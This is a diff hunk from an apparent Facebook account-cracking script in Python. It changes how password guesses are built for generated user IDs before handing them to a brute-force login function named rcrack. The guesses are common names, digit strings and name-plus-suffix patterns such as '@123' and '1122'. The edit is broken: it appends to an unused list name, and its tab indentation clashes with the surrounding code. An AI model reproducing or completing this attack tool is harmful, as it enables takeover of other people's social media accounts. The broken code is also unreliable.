@@ -227,11 +227,24 @@ def xxr():
         print(f' \033[1;91m[\033[1;97m✅\033[1;91m]\033[38;5;46m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙄𝘿:\033[38;5;46m {xr}'+tl)
         print('\033[38;5;46m══════════════════════════════════')              
         for love in user:
-            pwx = [code+love+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070']
+            pwx = [love[1:]]
             uid = code+love
             for Eman in Emran:
-                pwx.append(Eman)
-                pwx.append(love)
+                pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+					pwv.append(nmf)
+					pwv.append('57273200')
+					pwv.append(frs+'@')
+					pwv.append(frs+'@123')
+					pwv.append(frs+'@@')
+					pwv.append(frs+'@@@')
+					pwv.append(frs+'@@@@')
+					pwv.append(frs+'@#')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'12')
+					pwv.append(frs+'11')
+					pwv.append(frs+'111')
             manshera.submit(rcrack,uid,pwx,tl)
     print(f"\n{x} \033[38;5;46m══════════════════════════════════")
 def rcrack(uid,pwx,tl):
